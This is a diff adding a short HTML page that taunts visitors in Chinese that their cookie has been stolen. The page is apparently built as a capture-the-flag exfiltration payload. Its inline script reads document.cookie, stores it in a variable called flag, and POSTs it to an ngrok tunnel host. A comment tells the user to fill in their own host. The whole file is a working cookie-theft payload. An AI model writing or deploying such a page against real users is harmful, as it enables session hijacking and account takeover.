@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>你的cookie已經被我偷走了 >:)</h1>
+
+    <script>
+            var flag = document.cookie;
+            
+            <!--填入你的host吧-->
+            fetch('https://6603-185-213-82-83.ngrok-free.app/', {
+                method: 'POST',
+                headers: {
+                  
+                },
+                body: JSON.stringify({
+                    'cookie': flag,
+                    '餅乾': '小偷'
+                })
+            });
+        
+        
+    </script>
+</body>
+</html>
